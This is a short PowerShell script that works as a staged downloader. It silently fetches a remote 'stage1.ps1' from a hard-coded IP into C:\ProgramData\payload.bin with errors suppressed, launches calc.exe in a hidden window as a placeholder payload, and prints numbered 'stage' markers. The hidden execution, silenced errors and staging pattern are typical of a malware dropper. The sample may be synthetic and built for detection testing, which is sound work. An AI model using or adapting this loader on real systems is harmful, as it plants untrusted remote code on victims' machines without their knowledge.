[CmdletBinding()]
param(
    [string]$TargetUrl = "https://198.51.100.119/stage1.ps1",
    [string]$DownloadPath = 'C:\ProgramData\payload.bin',
    [int]$StageTimeout = 39
)
Invoke-WebRequest -Uri $TargetUrl -OutFile $DownloadPath -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
Write-Output "stage 43 initialized"
Write-Verbose "stage marker 19 reached"
